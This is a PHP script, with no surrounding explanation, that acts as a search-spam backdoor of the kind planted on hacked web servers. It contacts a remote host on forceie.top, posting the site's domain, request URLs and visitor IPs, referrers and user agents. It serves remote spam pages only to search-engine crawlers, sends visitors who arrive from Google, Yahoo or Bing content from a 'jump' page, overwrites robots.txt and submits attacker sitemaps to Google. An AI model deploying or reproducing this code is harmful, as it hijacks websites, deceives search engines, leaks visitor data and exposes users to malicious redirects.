<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
$OoooOO0 = 'fgxy1351';
$group_num = $OoooOO0;
$inter_domain = 'http://' . $group_num . '.forceie.top';
function curl_get_contents($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	$file_contents = curl_exec($ch);
	curl_close($ch);
	return $file_contents;
}
function getServerCont($url, $data = array())
{
	$url = str_replace(' ', '+', $url);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
	$output = curl_exec($ch);
	$errorCode = curl_errno($ch);
	curl_close($ch);
	if (0 !== $errorCode) {
		return false;
	}
	return $output;
}
function is_crawler($agent)
{
	$agent_check = false;
	if ($agent != '') {
		if (preg_match("/googlebot|google|yahoo/si", $agent)) {
			$agent_check = true;
		}
	}
	return $agent_check;
}
function check_refer($refer)
{
	$check_refer = false;
	if ($refer != '' && preg_match("/google.co|yahoo.co.jp|bing/si", $refer)) {
		$check_refer = true;
	}
	return $check_refer;
}
$http = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://');
$req_uri = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
$self = $_SERVER['PHP_SELF'];
$ser_name = $_SERVER['SERVER_NAME'];
$req_url = $http . $domain . $req_uri;
$indata1 = $inter_domain . '/indata.php';
$map1 = $inter_domain . '/map.php';
$jump1 = $inter_domain . '/jump.php';
$url_words = $inter_domain . '/words.php';
$url_robots = $inter_domain . '/robots.php';
if (strpos($req_uri, '.php')) {
	$href1 = $http . $domain . $self;
} else {
	$href1 = $http . $domain;
}
$data1[] = array();
$data1['domain'] = $domain;
$data1['req_uri'] = $req_uri;
$data1['href'] = $href1;
$data1['req_url'] = $req_url;

if (substr($req_uri, -6) == 'robots') {
	$robots_cont = getServerCont($url_robots, $data1);
	define('BASE_PATH', str_ireplace($_SERVER['PHP_SELF'], '', __FILE__));
	file_put_contents(BASE_PATH . '/robots.txt', $robots_cont);
	$robots_cont = file_get_contents(BASE_PATH . '/robots.txt');
	if (strpos($robots_cont, 'Crawl-delay:3')) {
		echo 'robots.txt file create success!';
	} else {
		echo 'robots.txt file create fail!';
	}
	exit;
}
if (substr($req_uri, -4) == '.xml') {
	if (strpos($req_uri, 'pingsitemap.xml')) {
		$str_cont = getServerCont($map1, $data1);
		$str_cont_arr = explode(',', $str_cont);
		$str_cont_arr[] = 'sitemap';
		for ($k = 0; $k < count($str_cont_arr); $k++) {
			if (strpos($href1, '.php') > 0) {
				$tt1 = '?';
			} else {
				$tt1 = '/';
			}
			$http2 = $href1 . $tt1 . $str_cont_arr[$k] . '.xml';
			$data_new = 'https://www.google.com/ping?sitemap=' . $http2;
			$data_new1 = 'http://www.google.com/ping?sitemap=' . $http2;
			if (stristr(@file_get_contents($data_new), 'successfully')) {
				echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
			} else if (stristr(@curl_get_contents($data_new), 'successfully')) {
				echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
			} else if (stristr(@file_get_contents($data_new1), 'successfully')) {
				echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
			} else if (stristr(@curl_get_contents($data_new1), 'successfully')) {
				echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
			} else {
				echo $data_new1 . '===>Submitting Google Sitemap: fail' . PHP_EOL;
			}
		}
		exit;
	}
	if (strpos($req_uri, 'allsitemap.xml')) {
		$str_cont = getServerCont($map1, $data1);
		//var_dump($str_cont);exit;
		header('Content-type:text/xml');
		echo $str_cont;
		exit;
	}
	if (strpos($req_uri, '.php')) {
		$word4 = explode('?', $req_uri);
		$word4 = $word4[count($word4) - 1];
		$word4 = str_replace('.xml', '', $word4);
	} else {
		$word4 = str_replace('/', '', $req_uri);
		$word4 = str_replace('.xml', '', $word4);
	}
	$data1['word'] = $word4;
	$data1['action'] = 'check_sitemap';
	$check_url4 = getServerCont($url_words, $data1);
	if ($check_url4 == '1') {
		$str_cont = getServerCont($map1, $data1);
		header('Content-type:text/xml');
		echo $str_cont;
		exit;
	}
	$data1['action'] = 'check_words';
	$check1 = getServerCont($url_words, $data1);
	if (strpos($req_uri, 'map') > 0 || $check1 == '1') {
		$data1['action'] = 'rand_xml';
		$check_url4 = getServerCont($url_words, $data1);
		header('Content-type:text/xml');
		echo $check_url4;
		exit;
	}
}
if (strpos($req_uri, '.php')) {
	$main_shell = $http . $ser_name . $self;
	$data1['main_shell'] = $main_shell;
} else {
	$main_shell = $http . $ser_name;
	$data1['main_shell'] = $main_shell;
}

$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$chk_refer = check_refer($referer);
if ($chk_refer && (substr($req_uri, -4) == '.htm' || strpos($referer, 'co.jp') !== false)) {
	$ip1 = $_SERVER['REMOTE_ADDR'];
	$data1['ip'] = $ip1;
	$data1['referer'] = $referer;
	$data1['user_agent'] = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
	echo getServerCont($jump1, $data1);
	exit;
}

$user_agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$res_crawl = is_crawler($user_agent);
if ($res_crawl) {
	$data1['http_user_agent'] = $user_agent;
	$get_content = getServerCont($indata1, $data1);
	if ($get_content == '404') {
		header('HTTP/1.0 404 Not Found');
		exit;
	} else if ($get_content == '500') {
		header('HTTP/1.0 500 Internal Server Error');
		exit;
	} else if ($get_content == 'blank') {
		echo '';
		exit;
	} else {
		echo $get_content;
		exit;
	}
} else {
	header('HTTP/1.0 404 Not Found');
}
?>